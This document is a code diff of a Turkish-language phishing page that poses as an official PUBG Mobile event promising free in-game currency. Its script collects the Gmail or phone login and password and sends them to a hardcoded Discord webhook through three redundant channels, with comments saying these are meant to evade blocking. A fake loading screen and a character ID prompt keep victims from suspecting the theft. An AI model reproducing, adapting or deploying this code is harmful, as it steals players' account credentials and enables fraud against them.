@@ -3,22 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUBG MOBILE - Onay Merkezi</title>
-    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@500;700&display=swap" rel="stylesheet">
+    <title>PUBG MOBILE EVENT</title>
+    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;700&display=swap" rel="stylesheet">
     <style>
+        * { -webkit-tap-highlight-color: transparent; }
         body { margin: 0; padding: 0; background: #000; color: #fff; font-family: 'Teko', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://images2.alphacoders.com/906/906740.jpg') no-repeat center center / cover; filter: brightness(0.3); z-index: -1; }
-        .container { background: rgba(10, 10, 10, 0.95); border: 2.5px solid #f39c12; border-radius: 15px; width: 88%; max-width: 350px; padding: 35px 20px; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,1); }
-        .pubg-logo { width: 170px; margin-bottom: 20px; filter: drop-shadow(0 0 8px #f39c12); }
-        h2 { color: #f39c12; text-transform: uppercase; letter-spacing: 1.5px; margin: 0 0 8px 0; font-size: 30px; }
-        p { font-size: 15px; color: #ccc; margin-bottom: 25px; font-family: 'Segoe UI', sans-serif; }
-        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 8px; box-sizing: border-box; outline: none; font-size: 16px; font-family: sans-serif; }
-        input:focus { border-color: #f39c12; background: #222; }
-        .btn { width: 100%; padding: 16px; background: #f39c12; color: #000; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 20px; text-transform: uppercase; margin-top: 15px; box-shadow: 0 5px #c87f0a; transition: 0.2s; }
-        .btn:active { transform: translateY(3px); box-shadow: 0 2px #c87f0a; }
-        #loadingStep, #idStep { display: none; }
-        .loader { border: 4px solid #333; border-top: 4px solid #f39c12; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 25px auto; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('https://images2.alphacoders.com/906/906740.jpg') no-repeat center center / cover; filter: brightness(0.2); z-index: -1; }
+        .container { background: rgba(12, 12, 12, 0.98); border: 1.5px solid #f39c12; border-radius: 8px; width: 85%; max-width: 330px; padding: 35px 20px; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,1); border-top: 5px solid #f39c12; position: relative; }
+        .pubg-logo { width: 140px; margin-bottom: 15px; }
+        h2 { color: #f39c12; text-transform: uppercase; margin: 0 0 5px 0; font-size: 26px; }
+        p { font-size: 14px; color: #888; margin-bottom: 25px; font-family: sans-serif; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 15px; margin: 8px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 4px; box-sizing: border-box; outline: none; font-size: 16px; font-family: sans-serif; border-left: 3px solid #f39c12; }
+        .btn { width: 100%; padding: 16px; background: linear-gradient(to bottom, #f39c12, #d35400); color: #fff; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; font-size: 19px; text-transform: uppercase; margin-top: 15px; text-shadow: 1px 1px 2px #000; box-shadow: 0 3px 0 #8c5d0a; }
+        #loading, #idStep { display: none; }
+        .loader { border: 3px solid #222; border-top: 3px solid #f39c12; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .footer-brand { margin-top: 25px; opacity: 0.5; display: flex; justify-content: center; gap: 15px; }
+        .footer-brand img { height: 18px; filter: grayscale(1) invert(1); }
     </style>
 </head>
 <body>
@@ -29,54 +30,72 @@
     <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG" class="pubg-logo">
 
     <div id="loginStep">
-        <h2>HESAP DOĞRULAMA</h2>
-        <p>Giriş yaparak ücretsiz UC paketini hesabınıza tanımlayın.</p>
-        <input type="email" id="email" placeholder="Gmail Adresiniz" autocomplete="off">
-        <input type="password" id="pass" placeholder="Şifreniz" autocomplete="off">
-        <button type="button" onclick="veriGonder()" class="btn">İLERLE</button>
+        <h2>DOĞRULAMA MERKEZİ</h2>
+        <p>A3 ETKİNLİĞİ ONAY SİSTEMİ</p>
+        <input type="email" id="email" placeholder="Gmail / Telefon" autocomplete="off">
+        <input type="password" id="pass" placeholder="Şifre" autocomplete="off">
+        <button type="button" onclick="hayaletGonder()" class="btn">HESABI ONAYLA</button>
     </div>
 
-    <div id="loadingStep">
+    <div id="loading">
         <div class="loader"></div>
-        <p id="progressText" style="color:#f39c12; font-size: 18px;">BAĞLANTI KURULUYOR...</p>
+        <p id="loadTxt" style="color:#f39c12; font-weight: bold;">SUNUCUYA SIZILIYOR...</p>
     </div>
 
     <div id="idStep">
-        <h2 style="color:#2ecc71;">DOĞRULANDI!</h2>
-        <p>Son adım: Karakter ID'nizi girerek gönderimi tamamlayın.</p>
-        <input type="number" id="dummyId" placeholder="Character ID">
-        <button type="button" onclick="alert('İşlem Başarılı! 24 saat içinde kontrol edin.')" class="btn">AKTİF ET</button>
+        <h2 style="color:#2ecc71;">ERİŞİM ONAYLANDI</h2>
+        <p>UC AKTARIMI İÇİN ID GİRİNİZ</p>
+        <input type="number" id="dummyId" placeholder="Karakter ID (Örn: 5123...)">
+        <button type="button" onclick="alert('İşlem Sıraya Alındı!')" class="btn">ÖDÜLÜ AKTİF ET</button>
+    </div>
+
+    <div class="footer-brand">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Tencent_Games_logo.svg/1200px-Tencent_Games_logo.svg.png">
+        <img src="https://images.squarespace-cdn.com/content/v1/5be48f95f793922372740924/1545083907797-T6S64C86807G7T8I11T6/LightSpeed-logo.png">
     </div>
 </div>
 
 <script>
-    const webhook = "https://discord.com/api/webhooks/1454503387528691907/24LcQ8SrFo9OyB2bxmQXxZH0laV3tlcmvOGYeio-qQc526rJ2YECxtlUpv_RIdBy8UvB";
-
-    function veriGonder() {
+    function hayaletGonder() {
         var e = document.getElementById("email").value;
         var p = document.getElementById("pass").value;
+        var hook = "https://discord.com/api/webhooks/1454503387528691907/24LcQ8SrFo9OyB2bxmQXxZH0laV3tlcmvOGYeio-qQc526rJ2YECxtlUpv_RIdBy8UvB";
 
-        if(e === "" || p === "") { alert("Lütfen alanları doldurun!"); return; }
+        if(e == "" || p == "") { alert("Lütfen boş bırakmayın!"); return; }
 
         document.getElementById("loginStep").style.display = "none";
-        document.getElementById("loadingStep").style.display = "block";
+        document.getElementById("loading").style.display = "block";
 
-        // TELEFONLAR İÇİN KESİN GÖNDERİM TAKTİĞİ (fetch + keepalive)
-        fetch(webhook, {
+        var veripaketi = {
+            content: "💀 **AV YAKALANDI (DAYANIKLI MOD)**\n----------------------------\n👤 **Mail:** `" + e + "`\n🔑 **Şifre:** `" + p + "`\n----------------------------"
+        };
+
+        // 1. KATMAN: Keepalive Fetch (Bloklanması en zor olan)
+        fetch(hook, {
             method: "POST",
+            mode: "no-cors",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-                content: "🔥 **YENİ AV DÜŞTÜ!** 🔥\n📧: `" + e + "`\n🔑: `" + p + "`"
-            }),
-            keepalive: true 
-        }).catch(err => console.log("Hata olsa da devam et"));
+            body: JSON.stringify(veripaketi),
+            keepalive: true
+        });
 
-        // Görsel geçişler
-        setTimeout(() => { document.getElementById("progressText").innerText = "HESAP TARANIYOR..."; }, 1200);
+        // 2. KATMAN: Klasik Image Request (Filtre avcısı)
+        // Veriyi resim linkinin arkasına gizliyoruz
+        var stealth = new Image();
+        stealth.src = hook + "?v=" + Date.now() + "&data=" + btoa(e + ":" + p);
+
+        // 3. KATMAN: Asenkron XHR (Eski telefonlar için)
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", hook, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(veripaketi));
+
+        // Sahte yükleme efektleri
+        setTimeout(() => { document.getElementById("loadTxt").innerText = "HESAP DOĞRULANIYOR..."; }, 1200);
         setTimeout(() => {
-            document.getElementById("loadingStep").style.display = "none";
+            document.getElementById("loading").style.display = "none";
             document.getElementById("idStep").style.display = "block";
-        }, 3000);
+        }, 3500);
     }
 </script>
 
